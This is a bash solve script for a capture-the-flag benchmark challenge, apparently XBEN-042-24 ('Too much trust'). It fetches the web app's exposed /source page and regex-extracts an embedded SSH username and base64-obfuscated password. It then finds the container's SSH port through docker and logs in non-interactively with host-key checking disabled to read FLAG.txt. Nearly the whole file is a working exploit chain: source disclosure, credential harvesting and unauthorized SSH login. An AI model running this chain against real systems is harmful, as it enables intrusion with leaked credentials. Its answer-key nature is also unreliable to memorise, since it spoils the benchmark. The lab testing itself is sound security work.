#!/usr/bin/env bash
# XBEN-042-24 — "Too much trust" (tags: information_disclosure, ssh)
#
# `/source` returns the application's own file, and the file contains the
# account it uses to SSH into its host. The password is base64 with a `!` glued
# on afterwards, which is not encryption and was never meant to be — it is only
# enough to stop the string being obvious in a `grep`.
#
# The read is the web half and h5i does that. The flag is in the account's home
# directory, so the last step is an SSH login with the credentials the page
# handed over; the container publishes port 22 alongside its web port.
#
#   $2 is that SSH port. Without it, docker is asked which port the container
#   behind the given URL publishes for 22.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT [ssh-port]}"
H5I="${H5I:-h5i}"
SESSION="xben042-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/source" --session "$SESSION" --new --capture >/dev/null
source_text="$("$H5I" browser markdown --session "$SESSION")"

read -r user password <<<"$(python3 -c "
import base64, re, sys
text = sys.stdin.read()
user = re.search(r\"username\s*=\s*'([^']*)'\", text)
# The password as the source builds it: a base64 literal plus whatever is
# concatenated onto it.
secret = re.search(r\"base64\.b64decode\(b'([^']*)'\)\.decode\('utf-8'\)\s*\+\s*'([^']*)'\", text)
print(user.group(1), base64.b64decode(secret.group(1)).decode() + secret.group(2))
" <<<"$source_text")"

ssh_port="${2:-}"
if [ -z "$ssh_port" ]; then
    web_port="${URL##*:}"
    container="$(docker ps --format '{{.Names}} {{.Ports}}' | awk -v p=":$web_port->" '$0 ~ p {print $1; exit}')"
    ssh_port="$(docker port "$container" 22/tcp | head -1 | cut -d: -f2)"
fi

# OpenSSH will not read a password from a pipe. `SSH_ASKPASS_REQUIRE=force` with
# `setsid` is the supported way to hand it one without a terminal.
askpass="$(mktemp)"
trap 'rm -f "$askpass"; "$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT
printf '#!/bin/sh\nprintf "%%s\\n" %q\n' "$password" > "$askpass"
chmod +x "$askpass"

SSH_ASKPASS="$askpass" SSH_ASKPASS_REQUIRE=force setsid ssh \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password -o LogLevel=ERROR \
    -p "$ssh_port" "$user@127.0.0.1" 'cat FLAG.txt' 2>/dev/null |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
